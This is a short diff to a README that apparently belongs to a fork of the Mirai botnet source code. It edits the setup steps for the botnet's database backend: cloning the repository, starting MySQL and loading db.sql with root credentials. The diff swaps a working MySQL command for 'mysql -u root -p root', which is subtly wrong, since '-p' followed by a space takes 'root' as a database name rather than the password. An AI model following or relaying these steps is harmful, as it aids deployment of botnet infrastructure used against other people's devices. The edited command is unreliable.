@@ -26,7 +26,10 @@ The [zip file](https://www.virustotal.com/en/file/f10667215040e87dae62dd48a5405b
 # git clone https://github.com/ware255/Mirai-Source-Code-plus.git
 # cd Mirai-Source-Code-plus/scripts
 # service mysql start
-# cat db.sql | mysql -uroot -proot
+```
+Update mysql database with this script (root:root is the user & pass I’ve set in my Mysql-server)
+```
+# cat db.sql | mysql -u root -p root
 ```
 Add users to mysql. 
 ```
